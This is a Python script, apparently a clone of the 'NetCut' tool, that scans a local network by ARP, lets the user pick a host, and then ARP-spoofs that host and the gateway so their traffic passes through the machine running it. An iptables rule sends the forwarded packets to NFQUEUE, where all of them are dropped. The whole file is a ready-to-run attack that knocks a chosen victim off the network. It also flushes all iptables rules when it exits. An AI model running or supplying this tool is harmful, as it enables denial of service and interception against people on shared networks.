#! /usr/bin/python3

import scapy.all as scapy
import os
import subprocess
import netifaces
import netfilterqueue
import threading
import sys
import time
from termcolor import colored


class NetworkScanner:
    
    def __init__(self, ip):
        self.is_root()

        self.ip = ip
        self.clients_list = []
        self.default_gateway = ""
        self.client_index = None
        self.client_ip = None
        self.client_mac = None
        self.gateway_ip = None
        self.gateway_mac = None

        self.print_clients()
        self.get_info()

    def is_root(self):
        if os.geteuid() == 0:
            print(colored("[+] Running as Root", "green"))
        else:
            print(colored("[-] Please run as Root... Quitting!!", "red"))
            sys.exit(1)

    def get_gatewayIP(self):
        gateways = netifaces.gateways()
        self.default_gateway = gateways['default'][netifaces.AF_INET][0]

    def net_scanner(self):
        arp_request = scapy.ARP(pdst=self.ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        response_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

        self.get_gatewayIP()

        for client in response_list:
            client_dict = {"ip" : client[1].psrc, "mac" : client[1].src}
            self.clients_list.append(client_dict)

    def print_clients(self):
        self.net_scanner()
        print(colored("\nGateway IP: ", "red") + colored(self.default_gateway, "green", attrs=["bold"]) + colored(" --> ", "blue") + colored(str(len(self.clients_list)), "green", attrs=["bold"]) + colored(" hosts are up.", "red"))
        print(colored("\nSNo.\t\tIP Address\t\tMAC Address", "yellow", attrs=["bold"]))
        print(colored("---------------------------------------------------------", "yellow", attrs=["bold"]))
        for index in range(1, len(self.clients_list)):
            print(colored("[" + str(index) + "]" + "\t\t" + self.clients_list[index]["ip"] + "\t\t" + self.clients_list[index]["mac"], "cyan")) 


class ARPSpoof(NetworkScanner):
    
    def get_info(self):
        print(colored("\nSelect a client to kick them out:-", "yellow"))
        try:
        	self.client_index = int(input(colored("NetCut>", "red", attrs=["bold"])))
        except KeyboardInterrupt:
        	print(colored("\n[-] CTRL-C Detected... Quitting!", "red"))
        	sys.exit(1)
        
        self.client_ip = self.clients_list[self.client_index]["ip"]
        self.client_mac = self.clients_list[self.client_index]["mac"]

        self.gateway_ip = self.clients_list[0]["ip"]
        self.gateway_mac = self.clients_list[0]["mac"]

    def arp_spoof(self, target_ip, target_mac, spoof_ip):
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)

    def restore_arp_spoof(self, destination_ip, destination_mac, source_ip, source_mac):
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, verbose=False)

    def perform_arp_spoof(self):
        try:
            while True:
                print(colored("\r[+] Spoofing Target", "green"), end="")
                self.arp_spoof(self.client_ip, self.client_mac, self.gateway_ip)
                self.arp_spoof(self.gateway_ip, self.gateway_mac, self.client_ip)
                time.sleep(1)
        except KeyboardInterrupt:
            print(colored("\n[-] CTRL+C detected.... Reverting the changes.... Please wait!!", "red"))
            self.restore_arp_spoof(self.client_ip, self.client_mac, self.gateway_ip, self.gateway_mac)
            self.restore_arp_spoof(self.gateway_ip, self.gateway_mac, self.client_ip, self.client_mac)


class NetCut():
    
    def process_packet(self, packet):
        packet.drop()

    def net_cut(self):
        try:
            subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])

            print(colored("\n[+] Started Capturing Packets....", "green"))
            queue = netfilterqueue.NetfilterQueue()
            queue.bind(0, self.process_packet)
            queue.run()

        except KeyboardInterrupt:
            print(colored("\n[-] CTRL-C Detected.... Quitting!!!", "red"))
            subprocess.call(["iptables", "--flush"])


if __name__ == '__main__':
	
	spoofer = ARPSpoof("192.168.1.0/24")
	threading.Thread(target=spoofer.perform_arp_spoof, args=()).start()

	netcut = NetCut()
	threading.Thread(target=netcut.net_cut, args=()).start()
